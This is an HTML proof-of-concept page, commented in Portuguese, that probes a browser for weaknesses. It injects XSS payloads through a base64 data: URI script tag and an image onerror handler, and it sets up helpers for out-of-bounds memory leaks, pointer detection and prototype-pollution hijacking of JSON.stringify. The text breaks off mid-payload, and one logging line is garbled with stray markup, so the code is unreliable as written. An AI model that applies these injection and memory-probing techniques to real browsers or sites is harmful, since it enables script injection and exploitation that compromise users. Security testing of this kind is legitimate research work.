<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PoC Combinado - PP Hijack JSON + Teste de Canvas</title>
    <style>
        /* Estilos CSS Originais (Script 1) + Canvas */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
        /* Estilos de Log (Aplicáveis a ambos os outputs) */
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
        .log-vuln { color: #ff4444; font-weight: bold; } /* Vermelho para vulnerabilidade confirmada */
        .log-good { color: #4CAF50; } /* Verde para bloqueio esperado / falha */
        .log-warn { color: #FFC107; }
        .log-error { color: #f44336; }
        .log-critical { color: #f0f; font-weight: bold; } /* Para mensagens críticas */
        .log-leak { color: #FF9800; font-weight: bold; } /* Laranja para leaks genéricos */
        .log-ptr { color: #f0f; font-weight: bold; } /* Magenta para POTENCIAIS ponteiros */

        /* Output Div Script 1 */
        #output { background: #222; border: 1px solid #444; padding: 10px; height: 60vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        /* Target XSS Script 1 */
        #xss-target-div { border: 2px dotted red; padding: 5px; margin: 15px 0; color: yellow; min-height: 40px; }

        /* Output Div Script 2 (Canvas) */
        #output-canvas { background: #2a2a2a; border: 1px solid #444; padding: 10px; height: 40vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        /* Canvas Element Script 2 */
        #interactive-canvas { display: block; border: 1px solid #444; margin-top: 5px; cursor: crosshair; background-color: #333; }
        /* Status Div Canvas Script 2 */
        #canvas-coord-status { color: #aaa; font-size: 12px; height: 15px; }

        hr { border: 1px solid #555; margin: 20px 0; }
    </style>
</head>
<body>
    <h1>PoC Combinado - PP Hijack JSON + Teste de Canvas</h1>

    <section>
        <h2>(Script 1: PP Hijack JSON)</h2>
        <p>Testa: XSS, OOB R/W (Info Leak), PP Básica, PP Hijack (JSON.stringify com Interação).</p>
        <button id="runBtn" onclick="runAllTests()">Iniciar Testes PP/OOB/XSS</button>
        <div id="output"></div>
        <div id="xss-target-div">Área para teste de XSS DOM (Script 1).</div>
    </section>

    <hr>

    <section>
        <h2>(Script 2: Teste de Canvas v21.1 Isolado)</h2>
        <p>Teste isolado de Canvas 2D com mais logs e verificações.</p>
        <canvas id="interactive-canvas" width="350" height="200"></canvas>
        <div id="canvas-coord-status">Passe o mouse sobre o canvas ↑</div>
        <button id="runCanvasBtn" onclick="runCanvasTest()">Iniciar Teste de Canvas</button>
        <div id="output-canvas"></div>
    </section>

    <script>
        // --- Script 1 Original Inteiro ---
        const outputDiv = document.getElementById('output'); // Usa #output
        const runBtn = document.getElementById('runBtn');
        const SHORT_PAUSE = 50; // ms
        const MEDIUM_PAUSE = 500; // ms
        let leakedValueFromOOB = null; // Armazena valor do Info Leak (Escopo Global)

        const log = (message, type = 'info') => { // Função de log para Script 1
            if (!outputDiv) return;
            try {
                const timestamp = `[${new Date().toLocaleTimeString()}]`;
                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                if(outputDiv.innerHTML.length > 500000){
                    outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 250000);
                    outputDiv.innerHTML = `<span class="log-info">[Log Truncado...]</span>\n` + outputDiv.innerHTML; // Usar info para não assustar
                }
                // Adicionada classe 'critical' se não existir
                const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical'].includes(type) ? type : 'info';
                 outputDiv.innerHTML += `<span class="log-<span class="math-inline">\{logClass\}"\></span>{timestamp} ${sanitizedMessage}\n</span>`;
                 outputDiv.scrollTop = outputDiv.scrollHeight;
             } catch(e) { console.error("Erro na função log (Script 1):", e); outputDiv = null; }
         };

         const toHex = (val, bits = 32) => { // toHex do Script 1
            if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
            let num = Number(val);
            if (bits <= 32) { num = num >>> 0; }
            const pad = Math.ceil(bits / 4);
            return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
         }

         const isPotentialPointer64 = (high, low) => {
             if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false;
             if (high === 0 && low === 0) return false;
             if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false;
             if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; // Padrões comuns de preenchimento
             if (high === 0 && low < 0x100000) return false; // Endereços muito baixos
             return true;
         };

         const isPotentialData32 = (val) => {
             if (val === null || typeof val !== 'number') return false;
             val = val >>> 0;
             if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; // Padrões comuns
             if (val < 0x1000) return false; // Valores muito pequenos
             return true;
         }

         const testCSPBypass = async () => {
             log("--- Iniciando Teste 1: CSP Bypass / XSS ---", 'test');
             log("Tentando XSS via data: URI (alert)...", 'subtest');
             await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
             try {
                 // Payload chama log() dentro dele para confirmar execução interna
                 const payloadJS = `try { alert('XSS via Data URI!'); log("[Payload Data:] Alerta data: URI executado!", "vuln"); } catch(e) { console.error('Data URI Payload Error:', e); log("[Payload Data:] Alerta data: URI bloqueado: " + e.message, "good"); }`;
                 const encodedPayload = btoa(payloadJS);
                 const scriptTag = document.createElement('script');
                 scriptTag.src = 'data:text/javascript;base64,' + encodedPayload;
                 scriptTag.onerror = () => { log("ERRO: Falha ao carregar script data: URI! (CSP ou outro erro)", 'error'); };
                 document.body.appendChild(scriptTag);
                 log("Tag <script> data: URI adicionada.", 'info');
             } catch (e) { log(`Erro ao criar/adicionar script data: URI: ${e.message}`, 'error'); }

             await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE * 2)); // Pausa maior para alert

             log("Tentando XSS DOM via inline handler (onerror)...", 'subtest');
             await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
             try {
                 const imgTag = document.createElement('img');
                 imgTag.src = 'invalid_image_source_' + Date.now();
                 // Payload do onerror também chama log()
                 const onerrorPayload = `
                     try {
                         const target = document.getElementById('xss-target-div');
                         if (target) {
                             target.innerHTML = '<h2 class="log-vuln">XSS DOM via ONERROR Executado!</h2>';
                             log("XSS DOM via onerror realizado!", "vuln"); // Loga sucesso aqui
                         } else { log("Alvo XSS DOM (onerror) não encontrado.", "error"); }
                         alert('XSS_DOM_ONERROR'); // Mantém o alert para confirmação visual
                     } catch(e) { console.error('Onerror Payload Error:', e); log("
